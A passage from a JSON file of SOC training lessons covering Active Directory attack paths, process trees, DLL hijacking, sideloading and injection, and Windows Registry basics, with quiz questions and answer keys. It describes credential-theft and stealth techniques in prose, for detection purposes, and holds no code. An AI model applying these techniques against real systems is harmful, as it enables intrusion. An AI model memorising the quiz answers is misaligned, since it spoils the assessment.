      "content": "Now the pieces come together into the single most important idea for a defender: **in a Windows enterprise, Active Directory is the crown jewel, and the Domain Controller is where the crown is kept.** Almost every significant intrusion — ransomware, espionage, insider abuse — converges on the same goal: gain control of Active Directory, because that grants control of everything that trusts it. Understanding AD is therefore not a Windows-admin nicety; it is the map of where attackers are trying to go.\n\n**The attacker's journey through AD** follows a recognisable arc, and each stage has a detection:\n\n1. **Initial foothold** on some ordinary workstation (often via phishing).\n2. **Enumeration** — mapping the domain with LDAP-based tools like BloodHound to find a path to privilege.\n3. **Credential theft and escalation** — Kerberoasting service accounts, dumping credentials, Pass-the-Hash — to climb toward Domain Admin.\n4. **Domain dominance** — reaching a Domain Controller and extracting `NTDS.dit` (or performing DCSync) to obtain every credential, and establishing durable persistence like a Golden Ticket.\n\n**The events a SOC watches** map onto this journey. A short set of Windows Security Event IDs carries most of the signal:\n\n- **4624 / 4625** — successful / failed logons.\n- **4768 / 4769** — Kerberos ticket-granting-ticket and service-ticket requests (spikes of 4769 suggest Kerberoasting).\n- **4776** — NTLM authentication validation (spikes suggest brute force or Pass-the-Hash).\n- **4720** — a user account was created.\n- **4728 / 4732** — a member was added to a privileged (global / local) group, such as Domain Admins.\n- **4662 / 5136** — directory object access and modification (used to spot DCSync and tampering).\n\n**The defensive model** built on this understanding is **tiering**: classify assets by privilege, with **Tier 0** being the Domain Controllers, Domain Admin accounts, and anything that can control them. The cardinal rule is to never let Tier 0 credentials be exposed on lower-tier machines, because an attacker who steals a Domain Admin's hash from an ordinary laptop has just skipped the entire journey above. Alongside tiering, defenders protect DCs fiercely, alert on privileged-group changes and DC-targeting activity, and deploy tools like **Microsoft Defender for Identity (MDI)** that watch AD specifically for these techniques.\n\nThe one sentence to carry out of this lesson: **whoever controls the Domain Controller controls the domain — so a SOC's job is to make reaching it as hard, and as loud, as possible.** Everything you will learn about specific AD attacks builds on this foundation of what Active Directory is and why it sits at the centre of the fight."
    }
  ],
  "keyTakeaways": [
    "Active Directory is Microsoft's directory service — the central database and system that authenticates users, authorizes access, and manages all accounts/computers/resources; its centralisation is powerful for admins and, if compromised, for attackers.",
    "A Domain Controller (DC) is the server that runs AD, hosts the Kerberos KDC, and stores the AD database NTDS.dit — which holds every account's password hash, making a DC compromise equivalent to owning the whole domain (Tier 0).",
    "AD is structured as forest > tree > domain > OU (the forest, not the domain, is the security/trust boundary), and holds objects — users, service accounts, computers, groups (Domain Admins/Enterprise Admins are the crown-jewel groups), each with a unique SID whose RID marks privilege (e.g. -512 Domain Admins, -500 Administrator).",
    "AD runs on LDAP (389/636 queries, abused by BloodHound), Kerberos (88 auth), DNS (SRV records locate DCs), GPO (policy pushed via SYSVOL), and multi-master replication (impersonated by DCSync); SOC defence centres on tiering (never expose Tier 0 creds), protecting DCs, and alerting on key events (4624/4625, 4768/4769, 4776, 4720, 4728/4732, 4662/5136)."
  ],
  "quiz": [
    {
      "question": "An attacker gains the ability to read the NTDS.dit file from a Domain Controller. Why is this considered a full domain compromise, and what makes the Domain Controller such a high-value target?",
      "options": [
        {
          "label": "It is not serious, because NTDS.dit only stores printer and network-share locations, so the attacker gains nothing beyond a directory of office resources.",
          "value": "a"
        },
        {
          "label": "NTDS.dit contains every object in the domain including all account password hashes, so reading it hands the attacker credentials to the entire organisation.",
          "value": "b"
        },
        {
          "label": "It only affects a single user, because each Domain Controller stores just the one administrator account that happens to be logged in at that moment.",
          "value": "c"
        },
        {
          "label": "The risk is purely about disk space, because NTDS.dit is a large file and copying it merely slows the Domain Controller down temporarily.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "NTDS.dit is the AD database file on a Domain Controller and contains every object in the domain, including the password hashes of all accounts up to the administrators, so obtaining it gives an attacker credentials to the whole organisation — which is why the DC is Tier 0 and its compromise equals domain compromise. Option a wrongly trivialises the file's contents. Option c is false because the DC holds the entire domain database, not one account. Option d ignores the actual credential exposure."
    },
    {
      "question": "In Active Directory, which statement about the forest and domain structure is correct, and why does it matter to a SOC analyst assessing the blast radius of an intrusion?",
      "options": [
        {
          "label": "Each Organisational Unit (OU) is a separate security boundary, so an attacker who compromises one OU can never affect users or computers in any other OU.",
          "value": "a"
        },
        {
          "label": "The forest is the true security boundary; everything inside it trusts each other deeply, so the analyst must treat the whole forest as potentially compromised together.",
          "value": "b"
        },
        {
          "label": "The individual domain is the outermost boundary, so a compromise can never spread from one domain to another domain within the same forest under any circumstances.",
          "value": "c"
        },
        {
          "label": "Trees are the top-level security boundary, so multiple forests inside a tree are fully isolated from one another and share no trust of any kind.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The forest — not the domain, OU, or tree — is Active Directory's real security boundary; everything inside a forest trusts each other at a deep level, so an analyst must consider the whole forest at risk together and recognise that owning one domain's DC creates a path across the forest. Option a is wrong because OUs organise objects and apply policy but are not security boundaries. Options c and d invert the hierarchy: the domain is not the outermost boundary, and forests are the top-level container, not trees."
    },
    {
      "question": "You are building detections for early-stage Active Directory attacks. Which pair of observations best matches its likely technique?",
      "options": [
        {
          "label": "A spike of Kerberos service-ticket requests (Event 4769) suggests Kerberoasting, and an account suddenly added to Domain Admins (Event 4728/4732) suggests privilege escalation or persistence.",
          "value": "a"
        },
        {
          "label": "A spike of Event 4769 means the DNS server crashed, and an Event 4728 means a user simply changed their own display name in their profile settings.",
          "value": "b"
        },
        {
          "label": "A spike of Event 4769 indicates a printer was installed, and Event 4732 shows that Group Policy successfully refreshed on a workstation as scheduled.",
          "value": "c"
        },
        {
          "label": "Both Event 4769 and Event 4728 only ever occur during routine backups, so neither is useful for detecting any Active Directory attack technique.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "A burst of Kerberos service-ticket requests (4769) is the classic Kerberoasting signature, since the attacker collects service tickets to crack offline, and adding an account to a privileged group like Domain Admins (4728/4732) is a hallmark of escalation or persistence — both are high-value AD detections. The other options misattribute these events to DNS crashes, display-name changes, printer installs, GPO refreshes, or backups, none of which is what these Security Event IDs record."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview",
    "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory",
    "https://attack.mitre.org/techniques/T1003/006/",
    "https://learn.microsoft.com/en-us/defender-for-identity/what-is"
  ],
  "xp": 220,
  "estimatedMinutes": 44,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-processes-pids-process-tree",
  "slug": "processes-pids-and-the-process-tree",
  "title": "Processes, PIDs, and the Process Tree",
  "topic": "Operating System Fundamentals",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Almost every investigation a SOC analyst runs comes down to one question: what was running on this machine, and did it belong there? Answering it means understanding processes — what they are, how the operating system names them with PIDs, and how each one is born from a parent, forming a family tree that tells the story of an attack. This beginner lesson builds that foundation from scratch: what a process actually is, how process IDs work, why the parent-child relationship is the single most important idea in endpoint investigation, and how to read a process tree to spot the intruder hiding in plain sight.",
  "sections": [
    {
      "heading": "What Is a Process?",
      "content": "A **process** is a program that is actually running. There is an important distinction here: a **program** is a file sitting on disk (like `chrome.exe` or `/usr/bin/python3`) — passive, doing nothing. When you launch it, the operating system loads that file into memory and starts executing it, and *that* running instance is a **process**. The same program can run as several processes at once; open three browser windows and you may have several browser processes, each a separate running instance of the same program file.\n\nWhen the operating system creates a process, it gives that process its own private set of resources:\n\n- **Memory space** — its own area of RAM to hold code and data, isolated from other processes so one crashing program does not corrupt another.\n- **Threads** — one or more streams of execution (the actual sequence of instructions being run). A process always has at least one thread.\n- **Handles** — references to things the process is using, like open files, network connections, or registry keys.\n- **A security context (token)** — *who* the process is running as. This determines its permissions: a process running as an administrator can do far more than one running as an ordinary user.\n\nThat last point is why processes matter so much to security. **A process acts with the privileges of whatever account it runs under.** When an attacker gets their code running inside a process — especially a privileged one — that code inherits those privileges. Much of endpoint defence is about noticing *which* processes are running, *what* they are doing, and *whose* authority they carry.\n\nFor an analyst, the mental shift is to stop thinking about \"programs\" and start thinking about \"running processes,\" because that is what you actually see in your tools. Task Manager on Windows and commands like `ps` and `top` on Linux list the live processes on a machine. Your EDR records them. When an alert fires, you are almost always looking at a process: what it is, where its file lives, what command line launched it, and — the subject of the rest of this lesson — where it came from."
    },
    {
      "heading": "Process IDs (PIDs) — How the OS Names Every Process",
      "content": "With potentially hundreds of processes running at once, the operating system needs a way to tell them apart. It does this with a **PID — a Process ID** — a unique number assigned to each process when it starts. If you see `PID 4728`, that number refers to exactly one running process on that machine at that moment.\n\nA few practical facts about PIDs that every analyst should internalise:\n\n- **PIDs are unique at a given time**, but **they are reused.** When a process ends, its PID is freed and can be handed to a brand-new, unrelated process later. So `PID 4728` this morning and `PID 4728` this afternoon may be two completely different programs. This is why you never identify a process by PID alone across time — you pair it with the process name, start time, and the machine.\n- **PIDs are how tools refer to a specific process.** To end a runaway process you \"kill\" it by PID; to inspect what a process is doing you point your tool at its PID. On Linux, `kill 4728` targets that process; on Windows, tools do the same behind the scenes.\n- **Some PIDs are special.** On Linux, **PID 1** is always the first process the system starts (`init` or `systemd`), the ancestor of everything else. On Windows, low PIDs belong to core system processes.\n\nThe reason PIDs matter for investigation is that they are the thread you pull to follow activity. An alert names a PID; you use it to find the process's file path, its command line, its network connections, and — crucially — its **parent**. Because PIDs get reused, good telemetry records not just the PID but the process's full identity (image path, hashes, command line, and start time) so you can be certain *which* instance you are looking at.\n\nThis is also why attackers cannot simply hide behind a number. Even if malware picks a convincing name, the PID lets your tools tie together everything that one specific running instance did — every file it touched, every connection it made, every child it spawned. Which brings us to the most important relationship of all: who launched whom."
    },
    {
      "heading": "Parent and Child Processes",
      "content": "Processes do not appear from nowhere. **Every process is created by another process** — the one that launches it is the **parent**, and the new one is the **child**. When you double-click an app, the process behind your desktop launches it, becoming its parent. That launched app might in turn open a helper, becoming a parent itself. The result is a family tree of processes, and reading that tree is the heart of endpoint investigation.\n\nJust as a PID identifies a process, the **PPID (Parent Process ID)** records which process was its parent. Together, PIDs and PPIDs let you reconstruct the entire ancestry: this process was launched by that one, which was launched by another, all the way back to the root.\n\n**Why does the SOC care so intensely about parent-child relationships?** Because legitimate software launches other software in *predictable* patterns, and attacks break those patterns. Certain parent-child pairs are normal; others are a screaming alarm. Consider these:\n\n- A **Word document** (`winword.exe`) launching **PowerShell** (`powershell.exe`) is deeply abnormal. Word has no legitimate reason to spawn a scripting engine — this is the classic signature of a **malicious macro** in a phishing document.\n- A **web server** process (`w3wp.exe`) launching a **command shell** (`cmd.exe`) strongly suggests a **web shell** — an attacker running commands through a compromised website.\n- **PowerShell** spawned by an unusual parent, then reaching out to the internet, is a common malware-execution chain.\n\nNone of these is suspicious because of the child alone — PowerShell and cmd are normal, useful tools. They are suspicious because of *who launched them*. This is the concept of **process lineage** or **ancestry**, and it is why modern telemetry always records the parent. The Windows **Sysmon** tool's process-creation event (Event ID **1**) captures exactly this: the process image, its command line, and the **parent image and parent command line** — precisely so an analyst can ask, \"does this parent launching this child make sense?\"\n\nThe skill to build is a sense of *normal* lineage, so the abnormal jumps out. An attacker's code has to run as *some* process, launched by *some* parent — and that parentage is very often the tell that separates a live intrusion from ordinary activity."
    },
    {
      "heading": "Reading the Process Tree in an Investigation",
      "content": "Put PIDs, PPIDs, and parent-child relationships together and you get the **process tree** — a hierarchical view of every process and who spawned it. Learning to read it is what turns a pile of individual events into the narrative of an attack.\n\n**What a healthy tree looks like.** On Windows, a few well-known processes anchor the tree, and knowing them lets you spot impostors:\n\n- **System** and core processes sit near the root.\n- **`services.exe`** launches **`svchost.exe`** instances, which host Windows services.\n- **`explorer.exe`** (the desktop) is the parent of the apps a *user* launches — browsers, Office, etc.\n\nAttackers must insert their activity *somewhere* into this tree, and the insertion point is often where they give themselves away.\n\n**A worked example.** Suppose an alert fires on a suspicious PowerShell process. You pull its process tree and walk **backwards** through the ancestry:\n\n1. The PowerShell process (child).\n2. Its parent: `winword.exe`.\n3. Word's parent: `explorer.exe` — the user opened the document themselves.\n\nIn three steps the tree has told you the whole initial-access story: a user opened a Word document (likely phishing), a macro launched PowerShell, and PowerShell is now doing something that tripped an alert. Then you walk **forwards** from the PowerShell process to see its own children and network connections — did it download a payload, spawn `cmd.exe`, or connect out to a command-and-control server? That reveals what the attack did *next*.\n\n**Two analyst habits make this reliable.** First, watch for **impersonation of trusted names**: malware may name itself `svch0st.exe` or run a real-looking `svchost.exe` from the wrong folder or under the wrong parent. The tree exposes this because a legitimate `svchost.exe` is launched by `services.exe`, not by a random user process. Second, remember that a suspicious child with an *innocent* parent, or an innocent child with a *suspicious* parent, both deserve scrutiny — the relationship is the signal.\n\nThe process tree is, in effect, the crime-scene reconstruction of the endpoint. The alert tells you *something* happened; the PIDs and PPIDs let you rebuild the exact sequence — patient zero, the execution chain, and the blast radius — which is exactly what you need to scope and contain the incident."
    }
  ],
  "keyTakeaways": [
    "A process is a running instance of a program, with its own memory, threads, handles, and a security token that gives it the privileges of the account it runs under — which is why what an attacker's code can do depends on the process it runs inside.",
    "A PID (Process ID) uniquely names each running process but is reused after a process ends, so analysts identify a process by PID plus name, path, and start time — never PID alone across time.",
    "Every process has a parent (recorded as the PPID); legitimate software launches other software in predictable patterns, so abnormal parent-child pairs (winword.exe->powershell.exe, w3wp.exe->cmd.exe) are among the strongest attack signals, captured by Sysmon Event ID 1.",
    "The process tree (PIDs + PPIDs) lets you reconstruct an attack: walk backward through ancestry to find root cause (e.g. a phishing document) and forward to find what executed next (payloads, shells, C2) — and it exposes impostors running trusted names from the wrong parent or path."
  ],
  "quiz": [
    {
      "question": "An EDR alert fires on a PowerShell process. You examine the process tree and find its parent process is winword.exe (Microsoft Word), whose own parent is explorer.exe. Why is this parent-child chain a strong indicator of an attack?",
      "options": [
        {
          "label": "It is completely normal, because Microsoft Word routinely launches PowerShell to render documents, so the chain shows healthy everyday activity and needs no review.",
          "value": "a"
        },
        {
          "label": "Word has no legitimate reason to spawn PowerShell, so this lineage matches a malicious macro in a document the user opened — a classic phishing execution chain.",
          "value": "b"
        },
        {
          "label": "It proves the machine is safe, because explorer.exe being the top parent guarantees that every process beneath it was digitally signed and approved.",
          "value": "c"
        },
        {
          "label": "The concern is only that PowerShell is inherently malicious software, so the identity of the parent process is irrelevant to judging whether this is an attack.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Word spawning PowerShell is abnormal lineage — a word processor has no legitimate reason to launch a scripting engine — and with explorer.exe above it, the chain shows a user opened a document whose macro ran PowerShell, the classic phishing execution pattern. Option a is false because Word does not normally launch PowerShell. Option c is wrong because explorer.exe being the ancestor guarantees nothing about safety. Option d is wrong because PowerShell is a legitimate tool; the parent's identity is exactly what makes this suspicious."
    },
    {
      "question": "During an investigation you note that PID 4728 was a suspicious process this morning, but the same PID now belongs to a normal system service this afternoon. What does this illustrate about process IDs?",
      "options": [
        {
          "label": "PIDs are permanent, so a single PID always refers to the exact same process forever, meaning this must be the identical program still running from the morning.",
          "value": "a"
        },
        {
          "label": "PIDs are unique at any moment but are reused after a process ends, so the same number can later belong to a completely different, unrelated process.",
          "value": "b"
        },
        {
          "label": "PIDs are assigned alphabetically by program name, so two processes sharing PID 4728 must be different versions of the very same application.",
          "value": "c"
        },
        {
          "label": "A repeated PID always signals malware impersonation, so the afternoon service is definitely the morning's suspicious process wearing a disguise.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "PIDs are unique only at a given moment; when a process ends, its PID is freed and can be reassigned to a new, unrelated process, so the same number across time can mean two different programs — which is why analysts pair PID with name, path, and start time. Option a is wrong because PIDs are not permanent. Option c invents an alphabetical scheme that does not exist. Option d over-reads a normal reuse as guaranteed impersonation."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer",
    "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
    "https://attack.mitre.org/techniques/T1059/"
  ],
  "xp": 200,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-dll-explained",
  "slug": "dlls-explained-shared-libraries-and-abuse",
  "title": "DLLs Explained: Shared Libraries and How Attackers Abuse Them",
  "topic": "Windows Fundamentals",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Open almost any Windows program and you will find it quietly loading dozens of files ending in .dll. These are DLLs — shared libraries of code that programs borrow instead of building everything themselves. They are fundamental to how Windows works, and precisely because they are so trusted and so numerous, they are a favourite hiding place for attackers. This lesson explains what a DLL actually is, how programs load them, and the family of techniques — hijacking, sideloading, and injection — that turn this everyday mechanism into a stealthy attack, along with what those attacks look like in your telemetry.",
  "sections": [
    {
      "heading": "What Is a DLL?",
      "content": "A **DLL — Dynamic Link Library** — is a file containing code and data that multiple programs can share, rather than each program carrying its own copy. The name unpacks its purpose: it is a **library** of reusable functions, **linked** to a program **dynamically** (at run time, not baked in when the program was built).\n\nThe real-life analogy is a shared toolbox in a workshop. Instead of every worker owning a full set of identical tools, they share one well-stocked toolbox and grab what they need. DLLs are Windows' shared toolbox: common tasks like drawing windows, opening files, or making network connections live in DLLs that any program can call.\n\nThis matters for two reasons:\n\n- **Efficiency and reuse.** Dozens of programs can use the same DLL, saving disk space and memory, and letting Microsoft fix a bug in one shared library rather than in every program.\n- **Windows itself is built from DLLs.** The core Windows API is delivered as DLLs. You will see the same handful constantly: **`kernel32.dll`** (core system functions), **`ntdll.dll`** (the low-level interface to the Windows kernel), **`user32.dll`** (windows and user interface), and **`advapi32.dll`** (security and registry). When a program does almost anything, it is calling functions inside these DLLs.\n\nContrast this with **static linking**, where a program bundles all the code it needs directly into its own `.exe`. Dynamic linking with DLLs is the Windows norm: the `.exe` is relatively small and pulls in the shared libraries it needs when it runs.\n\nFor an analyst, the key idea is that **a running process is not just its `.exe` — it is that executable plus all the DLLs it has loaded into its memory.** That is a strength for attackers: if they can get *their* code loaded as a DLL inside a trusted process, their code runs with that process's identity and privileges, wrapped in the legitimacy of a normal program. Understanding how DLLs get loaded, the next section, is what reveals how that abuse happens."
    },
    {
      "heading": "How Programs Load DLLs — and the Search Order",
      "content": "A program gets a DLL's code into its process in one of two ways, and the difference matters for how attackers abuse it.\n\n**Implicit (load-time) linking.** Most DLLs a program needs are listed in the executable itself, and Windows loads them automatically the moment the program starts. The program simply expects `kernel32.dll` and friends to be there.\n\n**Explicit (run-time) loading.** A program can also load a DLL on demand while running, by calling the Windows function **`LoadLibrary`** with a DLL's name, and then reaching into it for a specific function. This is how plugins and optional features work.\n\nThe security-critical detail is **how Windows finds a DLL when only its name is given.** If a program asks to load `helper.dll` without specifying exactly where it lives, Windows searches a defined sequence of locations — the **DLL search order** — until it finds a file by that name. Simplified, it looks in places like the folder the application launched from, then system folders like `System32`, then folders on the system `PATH`.\n\nThis search behaviour is the root of an entire attack class. **If an attacker can place a malicious `helper.dll` in a location Windows checks *before* the legitimate one, the program will load the attacker's DLL instead — while believing it loaded the real thing.** The program is not exploited in the traditional sense; it is simply tricked into picking up the wrong file because of where that file sits.\n\nTwo Windows tools also let DLLs be run more directly, and both show up in attacks:\n\n- **`rundll32.exe`** is a built-in program whose job is literally to run a function inside a DLL. Attackers abuse it to execute malicious DLL code while appearing to use a legitimate Windows binary (a living-off-the-land technique).\n- **`regsvr32.exe`** registers DLLs and can be abused similarly to execute code.\n\nSo the loading mechanism gives attackers several openings: substitute a DLL that a program will search for and load, or use trusted Windows binaries to run a DLL of their choosing. The next section walks through the specific techniques by name."
    },
    {
      "heading": "How Attackers Abuse DLLs",
      "content": "Because DLLs are trusted, numerous, and loaded automatically, they support several of the most common stealth techniques in modern intrusions. Three matter most to an analyst.\n\n**DLL Search-Order Hijacking.** The attacker exploits the search order from the previous section: they drop a malicious DLL with the name a program expects into a folder Windows checks first (often the application's own directory). When the program runs and searches for that DLL, it loads the attacker's version instead of the genuine one. The malicious code now runs inside a legitimate, often signed, application. MITRE ATT&CK tracks this as **Hijack Execution Flow: DLL Search Order Hijacking**.\n\n**DLL Sideloading.** A close cousin: the attacker brings along a *legitimate, signed* executable that is known to load a particular DLL, and places their malicious DLL alongside it. The trusted `.exe` dutifully loads the attacker's DLL. Because the executable is genuinely signed by a real vendor, this bypasses many trust checks — the malice is in the DLL sitting next to it, not the `.exe`. This is a favourite of advanced actors precisely because it launders their code through a reputable program.\n\n**DLL Injection.** Rather than tricking a program at load time, the attacker forces their DLL into an *already-running* process. Using Windows functions, they allocate memory inside the target process and make it load the malicious DLL. The attacker's code now executes from within, say, a normal browser or system process — inheriting its identity, its network reputation, and its privileges. This is one form of the broader **process injection** family.\n\nWhat unites all three is the goal of **execution under a trusted identity**. The attacker's code does not run as an obviously suspicious new program; it runs *inside* something Windows and your tools already trust. That is what makes DLL abuse stealthy and why signature-based defences, which focus on the `.exe`, often miss it.\n\nA related giveaway to remember: attackers frequently pair these techniques with **`rundll32.exe`** to launch DLL code directly, so a `rundll32` command line pointing at an unusual DLL or an odd path is a classic hunting lead."
    },
    {
      "heading": "Seeing DLL Abuse in Your Telemetry",
      "content": "DLL abuse is stealthy, but it is not invisible — it leaves distinct traces if you know where to look. The key is that loading a DLL, and dropping a DLL on disk, are both observable events.\n\n**The core signal: module (image) load events.** The Windows **Sysmon** tool records every DLL a process loads as **Event ID 7 (Image Loaded)**, capturing the loading process, the DLL's path, and its signature status. This is the workhorse for DLL hunting. What you look for is *anomaly*:\n\n- A **DLL loading from an unusual path** — a legitimate-sounding DLL in a user's Downloads or Temp folder, or in an application directory where it does not belong, rather than in `System32`.\n- An **unsigned DLL, or one signed by an unexpected vendor**, loaded into a trusted process.\n- A **well-known DLL name appearing in the wrong place**, the fingerprint of search-order hijacking and sideloading.\n\n**Supporting signals:**\n\n- **File-creation events** (Sysmon Event ID 11) showing a DLL being *written* to an application folder shortly before that application loads it — the setup step for hijacking/sideloading.\n- **Process and command-line telemetry** for **`rundll32.exe`** and **`regsvr32.exe`** invoking DLLs from odd locations or with suspicious arguments.\n- **Process injection indicators** (Sysmon Event IDs around remote-thread creation) when a DLL is forced into another process.\n\n**How to hunt.** Baseline what \"normal\" DLL loading looks like for your critical applications, then hunt for deviations: DLLs loaded from user-writable directories, unsigned modules in signed processes, and trusted binaries loading DLLs they normally never touch. Tie any find back to the **process tree** from the processes lesson — a sideloaded DLL often accompanies a freshly dropped executable and a suspicious parent, so the surrounding lineage strengthens the case.\n\nThe defensive mindset is to treat a *trusted process behaving untrustworthily* as the alarm. Because DLL abuse deliberately hides inside legitimate programs, you cannot rely on the process name; you rely on the details — *where* its DLLs came from, *whether* they are signed, and *whether* this program has any business loading them. Those details are exactly what module-load telemetry gives you."
    }
  ],
  "keyTakeaways": [
    "A DLL (Dynamic Link Library) is a shared library of code that programs load at run time instead of bundling their own copy; Windows itself is built from DLLs like kernel32.dll, ntdll.dll, and user32.dll, and a running process is its .exe plus all the DLLs loaded into it.",
    "When a program loads a DLL by name, Windows follows a defined search order, and if an attacker places a malicious DLL in a location searched first, the program loads it while believing it is the real one.",
    "The main abuse techniques are DLL search-order hijacking (drop a same-named DLL in a searched-first folder), DLL sideloading (place a malicious DLL beside a legitimate signed .exe that loads it), and DLL injection (force a DLL into a running process) — all aiming for execution under a trusted identity.",
    "Hunt DLL abuse with Sysmon Event ID 7 (image loaded): look for DLLs from unusual/user-writable paths, unsigned or wrong-vendor DLLs in trusted processes, well-known names in the wrong place, plus rundll32/regsvr32 loading odd DLLs — and tie findings back to the process tree."
  ],
  "quiz": [
    {
      "question": "An attacker places a malicious DLL named the same as one a legitimate signed application expects, in the application's own folder, so that when the app runs it loads the attacker's DLL instead of the genuine one. What is this technique called, and why is it effective?",
      "options": [
        {
          "label": "It is called static linking, and it works because the malicious code is compiled directly into the application's executable before it is ever signed.",
          "value": "a"
        },
        {
          "label": "It is DLL search-order hijacking, and it works because Windows searches certain folders first, so the attacker's DLL is found and loaded inside a trusted program.",
          "value": "b"
        },
        {
          "label": "It is a firewall bypass, and it works because DLLs travel over the network on trusted ports that perimeter defences are configured to always allow.",
          "value": "c"
        },
        {
          "label": "It is called PID reuse, and it works because the malicious DLL inherits the process ID of a system service that antivirus has already whitelisted.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Placing a malicious DLL with an expected name where Windows searches before the legitimate copy is DLL search-order hijacking; it is effective because the trusted (often signed) program loads the attacker's DLL believing it is genuine, so the code runs under that program's identity. Option a describes static linking, which is unrelated. Option c invents a network mechanism DLL loading does not use. Option d confuses this with PID reuse, which has nothing to do with DLL loading."
    },
    {
      "question": "Which telemetry is most directly useful for detecting a sideloaded or hijacked DLL, and what specifically would you look for?",
      "options": [
        {
          "label": "Firewall allow/deny logs, looking for the exact moment the DLL file was transmitted inbound over TCP port 445 from the attacker's server.",
          "value": "a"
        },
        {
          "label": "Sysmon Event ID 7 (image loaded), looking for a DLL loaded from an unusual or user-writable path, or an unsigned DLL inside a trusted process.",
          "value": "b"
        },
        {
          "label": "The Windows Registry Run keys, looking for the DLL's full contents stored as a value that executes automatically at every user logon.",
          "value": "c"
        },
        {
          "label": "DHCP lease records, looking for the DLL requesting its own IP address so it can communicate with the rest of the corporate network.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Sysmon Event ID 7 records every DLL a process loads with its path and signature status, so it is the workhorse for spotting sideloading and hijacking: a DLL from an unusual or user-writable path, or an unsigned/wrong-vendor DLL inside a trusted process, is the anomaly. Option a describes network transfer, not DLL loading. Option c misdescribes Run keys, which do not store DLL contents. Option d is nonsensical because DLLs do not request IP addresses."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1574/001/",
    "https://attack.mitre.org/techniques/T1574/002/",
    "https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order"
  ],
  "xp": 210,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-windows-registry-fundamentals",
  "slug": "windows-registry-fundamentals",
  "title": "The Windows Registry: Fundamentals for Analysts",
  "topic": "Windows Fundamentals",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Behind almost every setting on a Windows machine — from your desktop wallpaper to which programs start at boot — sits the Registry: a vast, hierarchical database that stores the configuration of Windows and everything installed on it. For a SOC analyst the Registry is both a map of how a system is configured and one of the most common places attackers hide to survive a reboot. This lesson explains what the Registry is, how it is structured into hives, keys, and values, the specific locations that matter for security, and how to read Registry activity in your telemetry.",
  "sections": [
    {
      "heading": "What the Registry Is",
      "content": "The **Windows Registry** is a central, hierarchical database that stores configuration settings for the operating system, hardware, installed applications, and user preferences. Almost everything Windows needs to remember about *how it should behave* lives here: which programs run at startup, file associations, driver settings, installed software, user profiles, and countless security-relevant options.\n\nThe cleanest analogy is a giant, organised **settings filing cabinet** for the whole computer. Where a phone keeps its settings in one Settings app, Windows keeps its settings — millions of them — in this single structured database that programs read and write constantly, usually without the user ever seeing it.\n\nYou can view the Registry with the built-in **Registry Editor** (`regedit`), which presents it as a tree you can browse, much like folders and files. But most Registry activity is invisible and automatic: when you install a program, it writes settings into the Registry; when Windows boots, it reads the Registry to know what to load; when you change a setting, that change is stored there.\n\nWhy does this matter so much to security? Two reasons that run through the whole lesson:\n\n- **The Registry controls what runs and how the system behaves.** If an attacker can write to the right place, they can make their malware launch automatically, weaken a security setting, or change how Windows handles something — all through configuration, without dropping an obviously malicious program.\n- **It is a durable place to hide.** Registry changes survive reboots. An attacker who only has code running in memory loses everything when the machine restarts; an attacker who has planted a Registry entry that relaunches their malware at boot has **persistence**.\n\nFor an analyst, the Registry is therefore both a rich source of evidence about a system's state and a prime hunting ground for attacker footholds. To use it, you first need to understand how it is organised — the subject of the next section."
    },
    {
      "heading": "Hives, Keys, and Values",
      "content": "The Registry is organised like a filing system, with three levels of structure an analyst should know by name.\n\n**Keys** are the containers, equivalent to folders. They can contain other keys (subkeys) and can nest many levels deep, forming the Registry's tree. A full path to a key reads like a folder path, for example `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows`.\n\n**Values** are the actual settings stored inside keys, equivalent to the files inside folders. Each value has a **name**, a **type** (such as a string, a number, or binary data), and its **data** (the setting itself). So a key is *where* a setting lives, and a value is the setting.\n\n**Hives** are the top-level branches — the major sections the whole tree is divided into. There are five you will meet, usually abbreviated:\n\n| Hive | Abbreviation | What it holds |\n|------|--------------|---------------|\n| HKEY_LOCAL_MACHINE | **HKLM** | System-wide settings for the whole machine and all users |\n| HKEY_CURRENT_USER | **HKCU** | Settings for the currently logged-on user |\n| HKEY_USERS | HKU | Settings for all user profiles on the machine |\n| HKEY_CLASSES_ROOT | HKCR | File associations and program registrations |\n| HKEY_CURRENT_CONFIG | HKCC | The current hardware profile |\n\nThe two that dominate investigations are **HKLM** and **HKCU**. The distinction is important and security-relevant: **HKLM** affects the *entire machine* and normally requires administrator rights to change, while **HKCU** affects only the *current user* and can be changed by that user without admin rights. This is why some persistence lives in HKCU (any user can write it) and some in HKLM (broader effect, needs privilege) — the choice tells you something about the attacker's access level.\n\nUnderstanding this structure lets you read any Registry path in a log or report: you can immediately see which hive (whole machine or one user), navigate the key path (the folders), and interpret the value (the specific setting) and its data. With that literacy, the security-critical locations in the next section become meaningful rather than mysterious."
    },
    {
      "heading": "The Registry Locations That Matter for Security",
